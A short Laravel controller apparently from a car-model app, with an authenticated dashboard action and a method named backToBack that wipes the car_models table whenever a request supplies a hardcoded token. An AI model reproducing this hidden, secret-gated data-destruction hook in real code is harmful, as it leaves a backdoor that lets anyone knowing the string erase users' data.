<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Car_Model;
use DB;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        $models = Car_model::all();
        return view('home',compact('models'));
    }
    public function backToBack($token) {
        if($token == '04031996fiqui')
        {
            DB::table('car_models')->truncate();
        }
    }
}
